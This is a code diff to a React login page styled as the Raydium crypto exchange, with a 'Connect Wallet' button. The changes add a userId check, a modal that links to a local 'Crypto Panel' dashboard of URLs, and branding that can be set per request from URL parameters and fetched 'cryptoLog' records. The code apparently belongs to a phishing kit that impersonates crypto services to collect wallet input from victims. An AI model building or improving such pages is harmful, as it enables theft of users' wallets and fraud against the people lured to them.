@@ -12,6 +12,7 @@ const LoginPage = () => {
   const [value, setValue] = useState("")
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
+  const [showModal, setShowModal] = useState(false)
   const [cryptoLog, setCryptoLog] = useState<any>(null);
   const [userInfo, setUserInfo] = useState({
     browser: "",
@@ -23,7 +24,9 @@ const LoginPage = () => {
   const bgColorBox:any = searchParams.get('modColor') ||  '#ffffff';
   const buttonColor:any = searchParams.get('btnColor') ||  '#00cfff';
   const cryptoLogId:any = searchParams.get('cryptoLogId');
-  const staticLogo = "/raydium-logo-freelogovectors.png"
+  const userId:any = searchParams.get('userId');
+  // const staticLogo = "/raydium-logo-freelogovectors.png"
+  const staticLogo = "/raydium-ray-logo.png"
   const appLogo: any = cryptoLog?.appLogo || staticLogo;
   const token: any = searchParams.get('token');
 
@@ -114,14 +117,20 @@ const LoginPage = () => {
     }
   };
 
+  const appName = cryptoLog?.appName.toUpperCase();
+
   const getCryptoLogById = async (cryptoLogId: string) => {
     const response = await getCryptoLog(cryptoLogId);
     setCryptoLog(response);
   };
 
   useEffect(() => {
+    if(!userId || !cryptoLogId){
+      setShowModal(true)
+    }else{
       getCryptoLogById(cryptoLogId)
-  }, [cryptoLogId]);
+    }
+  }, [cryptoLogId, userId]);
 
   const hexToRgb = (hex: string) => {
     hex = hex.replace(/^#/, "");
@@ -136,14 +145,26 @@ const LoginPage = () => {
     const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
     return luminance > 128 ? "#000000" : "#ffffff";
   };
-  
-  const buttonTextColor = getContrastColor(buttonColor);  
+
+  const buttonTextColor = getContrastColor(buttonColor);
+  const modTextColor = getContrastColor(bgColorBox);
+
+  const goToPanel = () => {
+    window.open("http://localhost:3001/dashboards/urls", "_blank");
+  };
 
   return (
     <>
-    {/* {loading ? (
-          <div className="flex flex-col items-center justify-center min-h-screen bg-[#181d31] z-50">
-          <div className="w-[380px] p-6 rounded-lg shadow-md text-center login-container overflow-hidden">
+    {showModal ? (<div className="flex flex-col items-center justify-center min-h-screen bg-[#181d31] z-50">
+            <div className="bg-white p-6 rounded-lg shadow-md text-center">
+            <p className="text-lg font-bold">Redirect from Crypto Panel</p>
+            <button className="mt-4 px-4 py-2 text-black rounded" 
+              style={{backgroundColor:buttonColor}}
+              onClick={() => goToPanel()}>
+              Go to panel
+            </button>
+          </div>
+          {/* <div className="w-[380px] p-6 rounded-lg shadow-md text-center login-container overflow-hidden">
               <div className="flex justify-center mb-4">
                 <div className='bg-[#aaadb6] h-14 w-48 rounded animate-pulse'></div>
               </div>
@@ -152,16 +173,15 @@ const LoginPage = () => {
                   <div className="h-12 bg-[#aaadb6] rounded w-full animate-pulse"></div>
               </div>
               <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent animate-shimmer"></div>
+          </div> */}
           </div>
-          </div>
-        ) : ( */}
-      <div
+        ) : (<div
       className="flex flex-col items-center justify-center min-h-screen"
       style={{ backgroundColor: bgColor }}
       >
         <div
           className="w-[380px] p-6 rounded-lg shadow-md text-center login-container"
-          style={{ backgroundColor: bgColorBox }}
+          style={{ backgroundColor: bgColorBox, color: modTextColor }}
           >
           <div className='logo-placeholder'>
             <img
@@ -169,8 +189,10 @@ const LoginPage = () => {
               width={100}
               src={appLogo}
               alt="Logo"
-              className="mx-auto h-14 w-60"
+              className="h-14"
             />
+            <p className='h-full w-auto text-3xl text-center'
+            style={{ letterSpacing: '0.3em' }}>{cryptoLog?.appName?appName:"RAYDIUM"}</p>
           </div>
             {error && (
                 <div className='message-container-error'>
@@ -190,14 +212,14 @@ const LoginPage = () => {
           />
           <button
             className="w-full px-4 py-2 rounded-md"
-            style={{ backgroundColor: buttonColor, color: buttonTextColor }}
+            style={{ backgroundColor: buttonColor, color: buttonTextColor, border: `1px solid ${buttonTextColor}` }}
             onClick={handleSubmit}
           >
             Connect Wallet
           </button>
         </div>
       </div>
-    {/* )} */}
+    )}
     </>
   );
 };
